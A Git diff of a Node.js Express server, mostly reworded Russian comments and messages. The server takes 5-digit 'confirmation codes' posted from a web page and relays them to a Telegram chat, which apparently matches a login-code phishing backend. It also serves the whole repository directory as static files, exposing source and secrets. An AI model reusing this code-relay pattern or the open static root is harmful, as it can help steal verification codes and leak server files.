@@ -9,23 +9,24 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// 1. Раздаем статику из КОРНЯ проекта (исправляет ошибку ENOENT public/index.html)
+// 1. Раздаем все статические файлы из КОРНЯ репозитория (без папки public)
 app.use(express.static(__dirname));
 
-// 2. Главная страница
+// 2. Главная страница сайта
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// 3. Пинг для предотвращения засыпания
+// 3. Эндпоинт пинга
 app.get('/ping', (req, res) => {
     res.status(200).send('OK');
 });
 
-// ===== 4. ЭНДПОИНТ ОТПРАВКИ 5-ЗНАЧНОГО КОДА =====
+// 4. НАСТРОЙКИ ТЕЛЕГРАМ (Укажи свои данные или используй Environment Variables в Render)
 const BOT_TOKEN = process.env.BOT_TOKEN || 'ВАШ_ТОКЕН_БОТА';
 const CHAT_ID = process.env.CHAT_ID || 'ВАШ_CHAT_ID';
 
+// 5. ОТПРАВКА 5-ЗНАЧНОГО КОДА В ТЕЛЕГРАМ
 app.post('/send-code', (req, res) => {
     const { code } = req.body;
     const cleanCode = code ? code.toString().trim() : '';
@@ -34,11 +35,11 @@ app.post('/send-code', (req, res) => {
     if (!/^\d{5}$/.test(cleanCode)) {
         return res.status(400).json({ 
             success: false, 
-            error: 'Код должен состоять ровно из 5 цифр' 
+            error: 'Код должен состоять из 5 цифр' 
         });
     }
 
-    console.log(`[SERVER]: Отправка кода ${cleanCode} в Telegram...`);
+    console.log(`[SERVER]: Отправка 5-значного кода: ${cleanCode}`);
 
     const message = encodeURIComponent(`🔑 Получен код подтверждения: ${cleanCode}`);
     const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
@@ -51,29 +52,29 @@ app.post('/send-code', (req, res) => {
             try {
                 const response = JSON.parse(rawData);
 
-                // ПРОВЕРЯЕМ: ответил ли Telegram "ok: true"
+                // Если Telegram вернул "ok: true"
                 if (apiRes.statusCode === 200 && response.ok) {
-                    console.log(`[TELEGRAM OK]: Код ${cleanCode} доставлен.`);
-                    return res.json({ success: true, message: 'Код успешно отправлен!' });
+                    console.log(`[TELEGRAM SUCCESS]: Код ${cleanCode} доставлен!`);
+                    return res.json({ success: true, message: 'Код отправлен' });
                 } else {
                     console.error(`[TELEGRAM ERROR]:`, response);
                     return res.status(400).json({ 
                         success: false, 
-                        error: response.description || 'Ошибка отправки в Telegram (проверьте Токен и Chat ID)' 
+                        error: response.description || 'Неверный токен бота или Chat ID' 
                     });
                 }
             } catch (err) {
                 console.error(`[PARSE ERROR]:`, err);
-                return res.status(500).json({ success: false, error: 'Ошибка ответа сервера Telegram' });
+                return res.status(500).json({ success: false, error: 'Ошибка ответа Telegram' });
             }
         });
     }).on('error', (err) => {
         console.error(`[NETWORK ERROR]:`, err.message);
-        res.status(500).json({ success: false, error: 'Ошибка соединения с Telegram' });
+        res.status(500).json({ success: false, error: 'Не удалось связаться с Telegram' });
     });
 });
 
-// ===== 5. ФУНКЦИЯ ЗАПУСКА PYTHON БОТА =====
+// 6. ЗАПУСК И ПЕРЕЗАПУСК PYTHON БОТА
 function startTelegramBot() {
     const pythonCmd = process.platform === 'win32' ? 'python' : 'python3';
     console.log(`🚀 Запуск бота: ${pythonCmd} bot.py...`);
@@ -84,14 +85,14 @@ function startTelegramBot() {
     botProcess.stderr.on('data', (data) => console.error(`[BOT ERROR]: ${data.toString().trim()}`));
 
     botProcess.on('close', (code) => {
-        console.log(`[BOT] Завершился с кодом ${code}. Перезапуск через 3 сек...`);
+        console.log(`[BOT] Процесс завершен (код ${code}). Перезапуск через 3 сек...`);
         setTimeout(startTelegramBot, 3000);
     });
 }
 
 startTelegramBot();
 
-// ===== 6. АВТОПИНГ ПРОТИВ СНА RENDER =====
+// 7. АВТОПИНГ СЕРВЕРА
 const SITE_URL = process.env.RENDER_EXTERNAL_URL;
 if (SITE_URL) {
     setInterval(() => {
@@ -100,5 +101,6 @@ if (SITE_URL) {
     }, 10 * 60 * 1000);
 }
 
+// 8. ЗАПУСК ЭКСПРЕСС СЕРВЕРА
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`🌐 Сервер запущен на порту ${PORT}`));
